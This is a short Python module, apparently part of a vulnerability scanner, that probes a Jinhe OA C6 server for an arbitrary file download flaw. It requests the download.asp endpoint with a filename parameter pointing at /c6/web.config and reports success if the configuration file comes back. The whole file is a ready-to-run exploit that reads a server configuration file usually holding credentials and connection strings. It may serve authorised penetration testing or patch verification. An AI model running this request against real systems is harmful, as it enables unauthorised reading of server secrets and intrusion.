'''
金和OA C6 任意文件下载
'''
import requests

from main import print_blue


def jdOA_anydownload(url, timeout=6):
    print_blue('金和OA-C6任意文件下载')
    return_data = ''
    # if not url[0:1] == '/':
    #     url = url + '/'
    try:
        re = requests.get(url + '/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config',
                          timeout=timeout, verify=False)
        re.encoding = 'utf-8'
        # print(re.text)
        if str(re) == '<Response [200]>':
            if not '不可用' in re.text and re.text:
                return '成功'
        else:
            return '失败'
    except ConnectionError as e:
        return '连接失败'
    except TimeoutError as e:
        return '连接超时'
    except Exception as e:
        return '未知错误：' + str(e)
